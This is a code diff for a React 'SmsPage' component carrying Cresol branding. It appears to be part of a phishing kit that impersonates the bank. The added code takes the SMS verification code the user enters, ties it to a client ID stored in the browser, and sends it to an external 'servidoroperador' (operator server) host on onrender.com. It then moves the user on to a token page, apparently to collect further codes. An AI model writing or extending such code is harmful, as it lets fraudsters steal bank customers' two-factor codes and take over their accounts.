@@ -1,5 +1,4 @@
-
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
@@ -7,12 +6,53 @@ import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.pn
 
 const SmsPage = () => {
   const [smsCode, setSmsCode] = useState("");
+  const [clientId, setClientId] = useState("");
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  useEffect(() => {
+    // Recuperar clientId do localStorage
+    const storedClientId = localStorage.getItem('clientId');
+    if (storedClientId) {
+      setClientId(storedClientId);
+      console.log('ClientId recuperado do localStorage:', storedClientId);
+    } else {
+      console.log('ClientId não encontrado no localStorage');
+    }
+  }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    // Navegar para a página de token após validar SMS
-    navigate("/token");
+    
+    if (!clientId) {
+      console.log('ClientId não disponível para envio do SMS');
+      return;
+    }
+
+    try {
+      console.log('Enviando código SMS para validação:', smsCode);
+      console.log('ClientId utilizado:', clientId);
+      
+      // Aqui você pode enviar o código SMS para a API usando o clientId
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/sms`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          smsCode: smsCode
+        })
+      });
+
+      if (response.ok) {
+        console.log('Código SMS enviado com sucesso');
+        // Navegar para a página de token após validar SMS
+        navigate("/token");
+      } else {
+        console.log('Erro ao enviar código SMS');
+      }
+    } catch (error) {
+      console.log('Erro durante envio do SMS:', error);
+    }
   };
 
   const handleBack = () => {
